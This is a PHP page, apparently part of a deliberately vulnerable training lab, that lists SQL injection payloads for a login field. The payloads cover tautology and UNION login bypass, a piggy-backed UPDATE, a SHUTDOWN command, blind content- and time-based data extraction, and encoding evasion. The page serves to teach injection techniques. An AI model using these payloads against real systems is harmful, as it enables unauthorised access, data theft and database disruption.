<?php
 include "templates/header.php";
?>
</head>
<body>
<ul>
<li>Enter <code>' or 1 = 1 -- </code> in the username box to bypass login using tautology sql injection.</li>
<br/>
<li>Enter <code>' UNION select userId from users; -- </code> in the usernam3 box to bypass login using UNION sql injection.</li>
<br/>
<li>Enter <code>' ; UPDATE users SET uActivity = '2000-01-01' where uUsername='hacker'; -- </code> in the username box to perform piggy-back sql injection.</li>
<br/> 
<li>Enter <code>' ; SHUTDOWN; -- </code> to execute stored procedure sql injection.
</li>
<br/>
<li>Enter <code>hacker' AND (SELECT SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1) from users_information P where P.userId = 4) = '<span style='color:red'>c</span>' -- </code> to perform blind content-based sql injection.
</li>
<br/>
<li>Enter <code>hacker' AND (SELECT sleep(5) from users_information P where P.userId = 4 AND SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1)  = '<span style='color:red'>c</span>') -- </code> to perform blind time-based sql injection.
</li>
<br/>
<li>Enter <code>hacker' OR char(0x64726f70) = 'drop' -- </code> to perform character encoding-based sql injection.
</li>
</ul>
<script src="/templates/copy_code.js"></script>
<?php
 include "templates/footer.php";
?>

